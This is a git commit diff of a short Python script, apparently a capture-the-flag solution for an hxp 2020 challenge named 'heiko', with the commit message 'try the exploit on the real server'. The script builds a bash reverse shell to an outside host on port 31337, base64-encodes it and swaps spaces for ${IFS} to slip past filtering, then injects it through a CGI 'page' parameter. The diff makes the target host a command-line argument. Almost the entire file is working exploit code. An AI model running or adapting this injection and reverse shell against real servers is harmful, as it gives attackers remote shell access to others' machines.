712b1032bbbc04319d6d853f4fd6955e3466e7d1
Ivan Komarov <Ivan.Komarov@dfyz.info>
2021-01-11 01:38:59 +0300

    try the exploit on the real server

--- hxp-2020/heiko/get_shell.py
+++ hxp-2020/heiko/get_shell.py
@@ -1,14 +1,17 @@
 import base64
 import requests
+import sys
 
 
 REV_SHELL = 'bash -i >& /dev/tcp/`getent hosts cursed.page | cut -d" " -f1`/31337 0>&1'
 SAFE_REV_SHELL = f'echo {base64.b64encode(REV_SHELL.encode()).decode()} | base64 -d | bash'.replace(' ', '${IFS}')
 CGI_READY_REV_SHELL = b'\xca-H' + SAFE_REV_SHELL.encode() + b'; id'
-VICTIM_ADDR = 'http://localhost:8820/'
+VICTIM_PORT = 8820
 
 
 if __name__ == '__main__':
-    requests.get(VICTIM_ADDR, params={
+    victim_host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
+    victim_addr = f'http://{victim_host}:{VICTIM_PORT}/'
+    requests.get(victim_addr, params={
         'page': CGI_READY_REV_SHELL,
     })
